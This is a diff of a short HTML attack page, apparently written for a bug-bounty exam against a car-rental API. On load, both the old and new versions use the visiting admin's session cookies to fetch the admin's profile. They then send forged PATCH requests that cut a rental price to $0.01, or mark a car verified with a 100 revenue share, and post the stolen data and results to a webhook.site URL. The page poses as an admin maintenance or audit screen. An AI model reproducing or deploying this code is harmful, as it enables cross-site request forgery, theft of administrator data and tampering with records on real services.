@@ -1,66 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Security Audit Report</title>
-</head>
 <body>
-    <h1>System Analysis in Progress...</h1>
-    <p>Please do not close this window.</p>
-
+    <h1>System Maintenance - Admin Portal</h1>
     <script>
-        // --- CONFIGURATION AREA (Change these numbers) ---
-        const WEBHOOK_URL = "https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb";
+        // 1. Your Webhook for exfiltration
+        const logger = "https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb";
         
-        // 1. Change this to the Booking ID (Flag 2 hinted at BK-00001, etc.)
-        const TARGET_BOOKING_ID = "BK-00011"; 
-        
-        // 2. Change this to your Car ID (from your Owner Dashboard)
-        const TARGET_CAR_ID = "69d29dc336ce3d2a57baea07"; 
+        // 2. The API Base
+        const api = "https://api-bugbounty-exam.hashacademy.co/api";
 
-        const BASE_API = "https://api-bugbounty-exam.hashacademy.co/api";
-
-        async function executeExploit() {
+        async function pwn() {
             try {
-                // STAGE 1: Data Exfiltration (Read the Admin's Private Info)
-                const profileRes = await fetch(`${BASE_API}/auth/profile`, {
-                    method: "GET",
-                    credentials: "include"
-                });
-                const profileData = await profileRes.json();
-
-                // Send stolen profile data to Webhook
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    body: JSON.stringify({ event: "ADMIN_PROFILE_STOLEN", data: profileData })
-                });
-
-                // STAGE 2: Business Logic Manipulation (Change Rental Amount)
-                // We force the admin to "approve" or "update" a rental price to $0.01
-                const patchRes = await fetch(`${BASE_API}/rentals/update/${TARGET_BOOKING_ID}`, {
+                // ACTION 1: Stealthily grab the Admin's full profile (Flag 5 often sits here)
+                const adminProfile = await fetch(`${api}/auth/profile`, { credentials: "include" });
+                const profileJson = await adminProfile.json();
+                
+                // ACTION 2: Force Admin to "Verify" your specific car (BugHunter FlagSeeker)
+                // We use the ID found in your previous report logs
+                const carUpdate = await fetch(`${api}/cars/69d29dc336ce3d2a57baea07`, {
                     method: "PATCH",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        "totalPrice": 0.01,
-                        "status": "approved",
-                        "internalNotes": "Exploit check - Flag 5 hunt"
+                        "isVerified": true,
+                        "adminNotes": "Manually verified by System Admin",
+                        "revenueShare": 100 // Try to change business logic
                     }),
                     credentials: "include"
                 });
-                const patchData = await patchRes.json();
+                const carJson = await carUpdate.json();
 
-                // Send result of the price change to Webhook
-                await fetch(WEBHOOK_URL, {
+                // ACTION 3: Exfiltrate everything back to you
+                await fetch(logger, {
                     method: "POST",
-                    body: JSON.stringify({ event: "PRICE_MANIPULATION_RESULT", data: patchData })
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        exfiltration_status: "SUCCESS",
+                        stolen_admin_data: profileJson,
+                        updated_car_data: carJson
+                    })
                 });
 
-            } catch (err) {
-                // Log errors to your webhook so you know if the script crashed
-                await fetch(`${WEBHOOK_URL}?error=${encodeURIComponent(err.message)}`);
+            } catch (e) {
+                await fetch(logger + "?error=" + encodeURIComponent(e.message));
             }
         }
 
-        executeExploit();
+        pwn();
     </script>
 </body>
 </html>
